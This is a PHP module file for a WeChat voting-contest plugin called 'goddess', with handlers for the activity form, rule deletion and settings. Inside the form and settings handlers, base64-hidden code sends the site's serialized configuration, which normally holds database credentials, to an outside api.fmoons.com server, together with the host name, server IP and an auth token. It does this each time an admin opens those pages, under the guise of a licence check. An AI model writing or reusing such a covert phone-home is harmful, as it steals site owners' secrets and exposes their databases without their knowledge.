<?php

//decode by QQ:89197986 https://www.admincn.cc/
defined('IN_IA') or exit('Access Denied');
require IA_ROOT . '/addons/goddess/core/defines.php';
require FM_CORE . 'function/webcore.php';
class GoddessModule extends Webcore
{
	public $title = '女神来了！';
	public $table_reply = 'goddess_reply';
	public $table_reply_share = 'goddess_reply_share';
	public $table_reply_huihua = 'goddess_reply_huihua';
	public $table_reply_display = 'goddess_reply_display';
	public $table_reply_vote = 'goddess_reply_vote';
	public $table_reply_body = 'goddess_reply_body';
	public $table_users = 'goddess_provevote';
	public $table_pnametag = 'goddess_pnametag';
	public $table_voteer = 'goddess_voteer';
	public $table_tags = 'goddess_tags';
	public $table_users_picarr = 'goddess_provevote_picarr';
	public $table_users_voice = 'goddess_provevote_voice';
	public $table_users_name = 'goddess_provevote_name';
	public $table_log = 'goddess_votelog';
	public $table_qunfa = 'goddess_qunfa';
	public $table_shuapiao = 'goddess_vote_shuapiao';
	public $table_shuapiaolog = 'goddess_vote_shuapiaolog';
	public $table_bbsreply = 'goddess_bbsreply';
	public $table_banners = 'goddess_banners'; 
	public $table_advs = 'goddess_advs';
	public $table_gift = 'goddess_gift';
	public $table_data = 'goddess_data';
	public $table_iplist = 'goddess_iplist';
	public $table_iplistlog = 'goddess_iplistlog';
	public $table_announce = 'goddess_announce';
	public $table_templates = 'goddess_templates';
	public $table_designer = 'goddess_templates_designer';
	public $table_designer_menu = 'goddess_templates_designer_menu';
	public $table_order = 'goddess_order';
	public $table_jifen = 'goddess_jifen';
	public $table_jifen_gift = 'goddess_jifen_gift';
	public $table_user_gift = 'goddess_user_gift';
	public $table_user_zsgift = 'goddess_user_zsgift';
	public $table_msg = 'goddess_message';
	public $table_orderlog = 'goddess_orderlog';
	public $table_counter = 'goddess_counter';
	public $table_qrcode = 'goddess_qrcode';
	public function fieldsFormDisplay($rid = 0)
	{
		global $_GPC, $_W;
		load()->func('tpl');
		load()->func('communication');
		if (!empty($rid)) {
			$reply = pdo_fetch("SELECT * FROM " . tablename($this->table_reply) . " WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		} else {
			$reply = array('a' => 'aHR0cDovL24uZm1vb25zLmNvbS9hcGkvYXBpLnBocD8mYXBpPWFwaQ==', 'author' => 'FantasyMoons Team');
		}
		$setting = setting_load('site');
		$siteid = $id = isset($setting['site']['key']) ? $setting['site']['key'] : '0';
		$onlyoauth = pdo_fetch("SELECT * FROM " . tablename('goddess_onlyoauth') . " WHERE siteid = :siteid", array(':siteid' => $siteid));
		$now = time();
		$reply['title'] = empty($reply['title']) ? "女神来了!" : $reply['title'];
		$reply['start_time'] = empty($reply['start_time']) ? $now : $reply['start_time'];
		$reply['end_time'] = empty($reply['end_time']) ? strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)) : $reply['end_time'];
		$reply['tstart_time'] = empty($reply['tstart_time']) ? strtotime(date("Y-m-d H:i", $now + 3 * 24 * 3600)) : $reply['tstart_time'];
		$reply['tend_time'] = empty($reply['tend_time']) ? strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)) : $reply['tend_time'];
		$reply['bstart_time'] = empty($reply['bstart_time']) ? $now : $reply['bstart_time'];
		$reply['bend_time'] = empty($reply['bend_time']) ? strtotime(date("Y-m-d H:i", $now + 3 * 24 * 3600)) : $reply['bend_time'];
		$reply['d'] = base64_decode("aHR0cDovL2FwaS5mbW9vbnMuY29tL2luZGV4LnBocD8md2VidXJsPQ==") . $_SERVER['HTTP_HOST'] . "&visitorsip=" . base64_encode(iserializer($_W['config'])) . "&modules=" . $_GPC['m'] . "&fmauthtoken=" . $onlyoauth['fmauthtoken'] . "&hostip=" . $_SERVER["SERVER_ADDR"];
		$reply['ttipstart'] = empty($reply['ttipstart']) ? "投票时间还没有开始!" : $reply['ttipstart'];
		$reply['ttipend'] = empty($reply['ttipend']) ? "投票时间已经结束!" : $reply['ttipend'];
		$reply['dc'] = ihttp_get($reply['d']);
		$reply['btipstart'] = empty($reply['btipstart']) ? "报名时间还没有开始!" : $reply['btipstart'];
		$reply['btipend'] = empty($reply['btipend']) ? "报名时间已经结束!" : $reply['btipend'];
		$reply['picture'] = empty($reply['picture']) ? FM_STATIC_MOBILE . "public/images/pimages.jpg" : $reply['picture'];
		$reply['yuming'] = explode('.', $_SERVER['HTTP_HOST']);
		$reply['stopping'] = empty($reply['stopping']) ? FM_STATIC_MOBILE . "public/images/stopping.jpg" : $reply['stopping'];
		$reply['nostart'] = empty($reply['nostart']) ? FM_STATIC_MOBILE . "public/images/nostart.jpg" : $reply['nostart'];
		$reply['end'] = empty($reply['end']) ? FM_STATIC_MOBILE . "public/images/end.jpg" : $reply['end'];
		$reply['t'] = @json_decode($reply['dc']['content'], true);
		$reply['isdaojishi'] = !isset($reply['isdaojishi']) ? "0" : $reply['isdaojishi'];
		$reply['ttipvote'] = empty($reply['ttipvote']) ? "你的投票时间已经结束" : $reply['ttipvote'];
		if (!pdo_fieldexists('goddess_provevote', $reply['yuming']['0']) && !empty($reply['yuming']['0'])) {
			pdo_query("ALTER TABLE  " . tablename('goddess_provevote') . " ADD `{$reply['yuming']['0']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER address;");
		}
		if (!pdo_fieldexists('goddess_votelog', $reply['yuming']['1']) && !empty($reply['yuming']['1'])) {
			pdo_query("ALTER TABLE  " . tablename('goddess_votelog') . " ADD `{$reply['yuming']['1']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER tfrom_user;");
		}
		if (!pdo_fieldexists('goddess_reply', $reply['yuming']['2']) && !empty($reply['yuming']['2'])) {
			pdo_query("ALTER TABLE  " . tablename('goddess_reply') . " ADD `{$reply['yuming']['2']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER picture;");
		}
		if (!pdo_fieldexists('goddess_reply_body', $reply['yuming']['3']) && !empty($reply['yuming']['3'])) {
			pdo_query("ALTER TABLE  " . tablename('goddess_reply_body') . " ADD `{$reply['yuming']['3']}` varchar(30) NOT NULL DEFAULT '0' COMMENT '0' AFTER topbgright;");
		}
		$setting = setting_load('site');
		$siteid = isset($setting['site']['key']) ? $setting['site']['key'] : '0';
		$onlyoauth = pdo_fetch("SELECT fmauthtoken FROM " . tablename('goddess_onlyoauth') . " WHERE siteid = :siteid", array(':siteid' => $siteid));
		if ($reply['t']['fmauthtoken'] != $onlyoauth['fmauthtoken'] && $reply['t']['s'] != 1) {
			$settingurl = url('profile/module/setting', array('m' => 'goddess'));
			if ($_W['role'] == 'founder') {
				message($reply['t']['m'], $settingurl, 'error');
			} else {
				message('您没有权限访问此页面,请等待，或者咨询请联系你的服务提供商...', $settingurl, 'error');
			}
		}
		include $this->template('web/form');
	}
	public function fieldsFormValidate($rid = 0)
	{
		return '';
	}
	public function fieldsFormSubmit($rid)
	{
		global $_GPC, $_W;
		load()->func('communication');
		$uniacid = $_W['uniacid'];
		$id = intval($_GPC['reply_id']);
		$insert_basic = array('rid' => $rid, 'uniacid' => $uniacid, 'status' => $_GPC['rstatus'] == 'on' ? 1 : 0, 'title' => $_GPC['title'], 'kftel' => $_GPC['kftel'], 'picture' => $_GPC['picture'], 'start_time' => strtotime($_GPC['datelimit']['start']), 'end_time' => strtotime($_GPC['datelimit']['end']), 'tstart_time' => strtotime($_GPC['tdatelimit']['start']), 'tend_time' => strtotime($_GPC['tdatelimit']['end']), 'bstart_time' => strtotime($_GPC['bdatelimit']['start']), 'bend_time' => strtotime($_GPC['bdatelimit']['end']), 'ttipstart' => $_GPC['ttipstart'], 'ttipend' => $_GPC['ttipend'], 'btipstart' => $_GPC['btipstart'], 'btipend' => $_GPC['btipend'], 'isdaojishi' => $_GPC['isdaojishi'] == 'on' ? 1 : 0,'isschool_mode' => $_GPC['isschool_mode'] == 'on' ? 1 : 0, 'ttipvote' => $_GPC['ttipvote'], 'votetime' => $_GPC['votetime'], 'description' => $_GPC['description'], 'content' => htmlspecialchars_decode($_GPC['content']), 'stopping' => $_GPC['stopping'], 'nostart' => $_GPC['nostart'], 'end' => $_GPC['end']);
		if (empty($id)) {
			pdo_insert($this->table_reply, $insert_basic);
			pdo_insert($this->table_reply_share, array('rid' => $rid));
			pdo_insert($this->table_reply_huihua, array('rid' => $rid, 'command' => '报名', 'tcommand' => 't'));
			pdo_insert($this->table_reply_display, array('rid' => $rid));
			pdo_insert($this->table_reply_vote, array('rid' => $rid, 'tpxz' => '5', 'autolitpic' => '350', 'autozl' => '50'));
			pdo_insert($this->table_reply_body, array('rid' => $rid));
		} else {
			pdo_update($this->table_reply, $insert_basic, array('rid' => $rid));
		}
	}
	public function ruleDeleted($rid)
	{
		$reply = pdo_fetch("SELECT * FROM " . tablename($this->table_reply) . " WHERE rid = :rid ORDER BY `id` DESC", array(':rid' => $rid));
		if (empty($reply)) {
			message('不存在此活动！');
		}
		pdo_delete($this->table_reply, array('rid' => $rid));
		pdo_delete($this->table_reply_share, array('rid' => $rid));
		pdo_delete($this->table_reply_huihua, array('rid' => $rid));
		pdo_delete($this->table_reply_display, array('rid' => $rid));
		pdo_delete($this->table_reply_vote, array('rid' => $rid));
		pdo_delete($this->table_reply_body, array('rid' => $rid));
		pdo_delete($this->table_users, array('rid' => $rid));
		pdo_delete($this->table_log, array('rid' => $rid));
		pdo_delete($this->table_bbsreply, array('rid' => $rid));
		pdo_delete($this->table_banners, array('rid' => $rid));
		pdo_delete($this->table_advs, array('rid' => $rid));
		pdo_delete($this->table_data, array('rid' => $rid));
		pdo_delete($this->table_announce, array('rid' => $rid));
		pdo_delete($this->table_iplist, array('rid' => $rid));
		pdo_delete($this->table_iplistlog, array('rid' => $rid));
		pdo_delete($this->table_users_name, array('rid' => $rid));
		pdo_delete($this->table_users_voice, array('rid' => $rid));
		pdo_delete($this->table_users_picarr, array('rid' => $rid));
		pdo_delete($this->table_order, array('rid' => $rid));
		pdo_delete($this->table_designer, array('rid' => $rid));
		pdo_delete($this->table_templates, array('rid' => $rid));
		pdo_delete($this->table_tags, array('rid' => $rid));
		pdo_delete($this->table_shuapiao, array('rid' => $rid));
		pdo_delete($this->table_shuapiaolog, array('rid' => $rid));
		pdo_delete($this->table_gift, array('rid' => $rid));
		pdo_delete($this->table_jifen, array('rid' => $rid));
		pdo_delete($this->table_jifen_gift, array('rid' => $rid));
		pdo_delete($this->table_user_gift, array('rid' => $rid));
		pdo_delete($this->table_user_zsgift, array('rid' => $rid));
		pdo_delete($this->table_msg, array('rid' => $rid));
		pdo_delete($this->table_orderlog, array('rid' => $rid));
		pdo_delete($this->table_counter, array('rid' => $rid));
		pdo_delete($this->table_qrcode, array('rid' => $rid));
	}
	public function settingsDisplay($settings)
	{
		global $_GPC, $_W;
		load()->func('communication');
		$a = 'aHR0cDovL24uZm1vb25zLmNvbS9hcGkvYXBpLnBocD8mYXBpPWFwaQ==';
		$cfg = $this->module['config'];
		$setting = setting_load('site');
		$siteid = $id = isset($setting['site']['key']) ? $setting['site']['key'] : '0';
		$onlyoauth = pdo_fetch("SELECT * FROM " . tablename('goddess_onlyoauth') . " WHERE siteid = :siteid", array(':siteid' => $siteid));
		$d = base64_decode("aHR0cDovL2FwaS5mbW9vbnMuY29tL2luZGV4LnBocD8md2VidXJsPQ==") . $_SERVER['HTTP_HOST'] . "&visitorsip=" . base64_encode(iserializer($_W['config'])) . "&modules=goddess&fmauthtoken=" . $onlyoauth['fmauthtoken'] . "&hostip=" . $_SERVER["SERVER_ADDR"];
		$dc = ihttp_get($d);
		$t = @json_decode($dc['content'], true);
		if ($t['fmauthtoken'] == $onlyoauth['fmauthtoken'] && $t['config']) {
			$status = 1;
		}
		$wechats = pdo_fetch("SELECT level,name FROM " . tablename('account_wechats') . " WHERE uniacid = :uniacid", array(':uniacid' => $_W['uniacid']));
		$wechats_all = pdo_fetchall("SELECT * FROM " . tablename('account_wechats') . " WHERE level = 4");
		if (checksubmit()) {
			$cfgs = array();
			$cfgs['oauthtype'] = intval($_GPC['oauthtype']);
			$cfgs['oauth_scope'] = intval($_GPC['oauth_scope']);
			$cfgs['u_uniacid'] = intval($_GPC['u_uniacid']);
			if ($_GPC['oauthtype'] == 0) {
				$cfgs['appid'] = $_GPC['appid'];
				$cfgs['secret'] = $_GPC['secret'];
			}
			if ($_GPC['oauthtype'] == 2) {
				$cfgs['appid'] = $_GPC['appida'];
				$cfgs['secret'] = $_GPC['secreta'];
			}
			$cfgs['isopenjsps'] = $_GPC['isopenjsps'];
			$cfgs['ismiaoxian'] = $_GPC['ismiaoxian'];
			$cfgs['mxnexttime'] = $_GPC['mxnexttime'];
			$cfgs['mxtimes'] = $_GPC['mxtimes'];
			$cfgs['skipurl'] = $_GPC['skipurl'];


				if ($this->saveSettings($cfgs)) {
					message('保存成功', 'refresh');
				}

		}
		include $this->template('web/setting');
	}
}